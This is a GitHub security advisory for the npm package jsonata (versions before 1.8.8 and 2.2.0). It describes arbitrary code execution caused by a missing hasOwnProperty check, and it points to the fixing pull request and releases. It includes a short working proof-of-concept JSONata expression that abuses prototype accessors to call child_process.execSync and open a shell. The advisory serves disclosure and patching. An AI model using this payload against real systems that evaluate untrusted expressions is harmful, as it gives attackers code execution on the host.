# [C] JSONata: Arbitrary Code Execution via crafted JSONata expressions

## Summary
Severity: Critical
Advisory: GHSA-8gq3-vp5j-2grp
CVE: CVE-2026-77413
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-21
Source: https://github.com/advisories/GHSA-8gq3-vp5j-2grp
Type: github-advisory

## Affected
- npm: `jsonata` — affected >=0 <1.8.8
- npm: `jsonata` — affected >=2.0.0 <2.2.0

## Details
## Impact

Before JSONata `2.2.0` and `1.8.8` it was possible to execute arbitrary code with crafted expressions, due to a missing `hasOwnProperty` check in the `lookup` function:
https://github.com/jsonata-js/jsonata/blob/f9632e01e6e67d4f9f00593f9795420cb4b57f48/src/functions.js#L1686-L1705

This was fixed with https://github.com/jsonata-js/jsonata/pull/794, which is included in the `2.2.0` release, and ported in the `1.8.8` release.

## PoC

```js
import jsonata from "jsonata";

const expression = jsonata(`
(
   __lookupSetter__('__proto__')(constructor);
   __defineGetter__('l', constructor("return
process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'}).toString()"));
   valueOf().l
)
`);

await expression.evaluate({});
```

## References
- https://github.com/jsonata-js/jsonata/security/advisories/GHSA-8gq3-vp5j-2grp
- https://github.com/jsonata-js/jsonata/pull/794
- https://github.com/jsonata-js/jsonata/commit/4b217d514376e30cba278941298d7ba97c4a6c6e
- https://github.com/jsonata-js/jsonata/commit/4c5f4adfb90a9b500889d50f90050ca68888b50d
- https://github.com/jsonata-js/jsonata
- https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8
- https://github.com/jsonata-js/jsonata/releases/tag/v2.2.0
